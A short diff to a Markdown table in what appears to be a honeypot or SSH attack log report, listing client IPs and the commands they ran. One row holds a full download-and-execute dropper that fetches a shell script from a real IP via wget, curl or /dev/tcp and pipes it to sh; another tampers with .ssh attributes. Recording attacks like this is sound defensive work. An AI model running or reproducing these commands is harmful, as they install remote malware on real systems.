@@ -58,8 +58,7 @@ system. The table is sorted by the number of attempts.
 
 | Client | Command |
 |--------|---------|
-| 5.182.211.148 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://154.216.19.57/sh \|\| curl http://154.216.19.57/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/154.216.19.57/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 154.216.19.57\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi
- |
+| 5.182.211.148 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://154.216.19.57/sh \|\| curl http://154.216.19.57/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/154.216.19.57/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 154.216.19.57\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
 | 1.92.121.249 | uname -s -m |
 | 119.96.31.97 | uname -s -m |
 | 192.241.141.141 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
